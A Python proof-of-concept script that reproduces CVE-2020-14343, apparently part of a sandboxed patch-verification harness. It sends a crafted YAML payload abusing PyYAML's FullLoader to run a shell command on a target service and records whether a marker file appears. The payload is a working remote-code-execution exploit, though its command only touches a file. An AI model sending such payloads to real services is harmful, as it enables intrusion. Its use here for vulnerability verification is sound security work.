#!/usr/bin/env python3
"""CVE-2020-14343 reproduction (PyYAML FullLoader RCE, pyyaml<=5.3.1).

Contract: exit 0 + verdict.json (exploitable=true) iff the exploit lands.
Run against a service started in the same sandbox instance (shared /tmp).
"""

import json
import os
import sys
import urllib.request

TARGET = os.environ.get("TARGET_URL", "http://127.0.0.1:8000")
MARKER = "/tmp/patchproof_pwned"

PAYLOAD = b"""!!python/object/new:type
  args: ["z", !!python/tuple [], {"extend": !!python/name:exec }]
  listitems: "__import__('os').system('touch /tmp/patchproof_pwned')"
"""


def write_verdict(exploitable: bool, evidence: str) -> None:
    verdict = {
        "cve_id": "CVE-2020-14343",
        "exploitable": exploitable,
        "evidence": evidence,
    }
    with open("verdict.json", "w") as fh:
        json.dump(verdict, fh, indent=2)
    print(json.dumps(verdict))


def main() -> int:
    if os.path.exists(MARKER):
        os.remove(MARKER)

    req = urllib.request.Request(
        f"{TARGET}/config", data=PAYLOAD,
        headers={"Content-Type": "application/yaml"},
    )
    try:
        urllib.request.urlopen(req, timeout=10)
    except Exception as exc:  # noqa: BLE001 - report any failure in verdict
        write_verdict(False, f"request failed: {exc}")
        return 1

    if os.path.exists(MARKER):
        write_verdict(True, f"RCE confirmed: marker created at {MARKER}")
        return 0

    write_verdict(False, "marker absent after payload — not affected")
    return 1


if __name__ == "__main__":
    sys.exit(main())
